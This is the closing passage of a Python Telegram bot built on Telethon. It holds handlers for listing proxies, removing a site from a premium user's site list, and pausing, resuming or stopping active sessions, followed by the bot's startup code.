    await event.reply(premium_emoji(f"Proxies ({len(proxies)}):\n<code>{chr(10).join(proxies[:20])}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rm\s+'))
async def rm_site(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    site = event.text.split(' ', 1)[1].strip()
    sites = load_lines(SITES_FILE)
    if site not in sites: return await event.reply("Site not found.")
    sites.remove(site)
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in sites: await f.write(s + '\n')
    await event.reply(f"Removed {site}")

# ===================== CALLBACKS =====================
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_cb(event):
    for key, val in active_sessions.items():
        if str(event.sender_id) in key:
            val['paused'] = True
            await event.answer("⏸️ Paused")
            return

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_cb(event):
    for key, val in active_sessions.items():
        if str(event.sender_id) in key:
            val['paused'] = False
            await event.answer("▶️ Resumed")
            return

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_cb(event):
    for key in list(active_sessions.keys()):
        if str(event.sender_id) in key:
            del active_sessions[key]
            await event.answer("🛑 Stopped")
            return

# ===================== ADMIN COMMANDS (placeholder) =====================
# Since your premium system is simple, you can add /addpremium etc. by directly editing premium.txt
# Implement only if needed; for now we rely on the file.

print("Bot started!")
bot.run_until_disconnected()
